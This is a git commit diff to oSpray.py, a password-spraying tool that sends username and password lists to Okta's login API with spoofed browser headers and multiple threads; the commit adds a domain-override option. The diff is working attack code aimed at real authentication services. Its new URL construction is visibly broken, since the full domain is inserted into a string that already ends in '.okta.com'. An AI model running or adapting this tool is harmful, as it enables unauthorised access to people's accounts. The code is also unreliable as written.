714fce1e33a239c0a9d539ef2af12365dc80e4cd
Ben Sebastian <ke8hnb@protonmail.com>
2021-06-09 13:33:35 -0400

    Create support for overriding domain

--- oSpray.py
+++ oSpray.py
@@ -7,17 +7,19 @@ parser.add_argument("subdomain", help="The subdomain of okta.com to attempt the 
 parser.add_argument("userList", help="The newline delimited list of users to password spray")
 parser.add_argument("passList", help="The newline delimited list of passwords to spray.")
 parser.add_argument("--threads", help="Number of threads. Default: 7", default=7, type=int)
+parser.add_argument("--domain", help="Override default domain of okta.com", default="okta.com", type=str)
 parser.add_argument("--csv", help="Change the output to CSV format", action='store_true')
 args = parser.parse_args()
 
-subdomain = args.subdomain.replace(".okta.com", "")
+uri = args.subdomain + "." + args.domain
+print(uri)
 
 def checkCreds(creds):
     username, password = creds
     session = requests.Session()
     rawBody = "{\"username\":\"%s\",\"options\":{\"warnBeforePasswordExpired\":true,\"multiOptionalFactorEnroll\":true},\"password\":\"%s\"}" % (username, password)
     headers = {"Accept":"application/json","X-Requested-With":"XMLHttpRequest","X-Okta-User-Agent-Extended":"okta-signin-widget-2.12.0","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0","Accept-Encoding":"gzip, deflate","Accept-Language":"en","Content-Type":"application/json"}
-    response = session.post("https://%s.okta.com/api/v1/authn"%subdomain, data=rawBody, headers=headers)
+    response = session.post("https://%s.okta.com/api/v1/authn"%uri, data=rawBody, headers=headers)
     if response.status_code == 200 and 'status' in response.json():
         jsonData = response.json()
         if "LOCKED_OUT" == jsonData['status']:
